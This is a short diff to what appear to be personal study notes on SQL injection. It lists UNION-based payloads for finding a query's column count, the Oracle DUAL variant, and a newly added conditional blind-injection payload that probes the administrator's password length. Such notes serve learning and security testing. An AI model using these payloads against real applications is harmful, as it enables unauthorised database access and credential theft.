@@ -86,3 +86,5 @@ The UNION keyword enables you to execute one or more additional SELECT queries a
 Determining the number of columns: `' ORDER BY 1--` or `' UNION SELECT NULL,NULL--` (note: number of nulls, order by = number of columns)
 
 On Oracle, every SELECT query must use the FROM keyword and specify a valid table: `' UNION SELECT NULL FROM DUAL--`
+
+conditional based blind SQL injection:`' union select null from users where username='administrator' and 1 = (SELECT CASE WHEN (length(password)=10) THEN 1/(SELECT 0) ELSE NULL END)--`
